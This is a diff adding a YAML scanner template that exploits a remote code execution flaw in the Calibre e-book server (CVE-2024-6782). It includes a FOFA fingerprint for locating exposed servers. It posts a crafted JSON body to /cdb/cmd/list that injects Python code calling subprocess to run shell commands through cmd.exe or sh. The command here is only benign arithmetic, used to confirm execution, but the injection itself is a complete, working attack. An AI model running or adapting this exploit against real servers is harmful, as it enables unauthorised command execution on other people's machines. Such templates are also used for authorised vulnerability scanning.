@@ -1,0 +1,49 @@
+id: poc-yaml-calibre-rce-2024-6782
+info:
+  name: Calibre 远程代码执行漏洞(CVE-2024-6782)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2024-6782
+  finger: calibre
+  fofa: 'Server: calibre'
+variables:
+  t1: random_int(1000,10000)
+  t2: random_int(1000,10000)
+  t3: t1 + t2
+  payload: '"set "+ "/a " + str(t1) + " + " + str(t2)
+
+    "expr "+ str(t1) + " + " + str(t2)
+
+    '
+requests:
+- method: GET
+  path: /interface-data/books-init
+  expression: status_code == 200 && contains(body,"book_ids")
+  output:
+  - regex_match(body,`"book_ids"\x3a \[(?P<book_ids>[0-9]+)`)
+- method: POST
+  path: /cdb/cmd/list
+  headers:
+    Content-Type: application/json
+  data: '[
+
+    ["template"],
+
+    "",
+
+    "",
+
+    "",
+
+    1,
+
+    "python:def evaluate(a, b):\n  import subprocess\n  try:\n    return subprocess.check_output([''cmd.exe'',
+    ''/c'', ''{{.payload}}''])\n  except Exception:\n    return subprocess.check_output([''sh'',
+    ''-c'', ''{{.payload}}''])\n"
+
+    ]'
+  expression: status_code == 200 && contains(body,`b'`+t3) && contains(body,"\"result\":")
+    && contains(body,"TEMPLATE ERROR") && contains(content_type,"application/json")
+transport: http
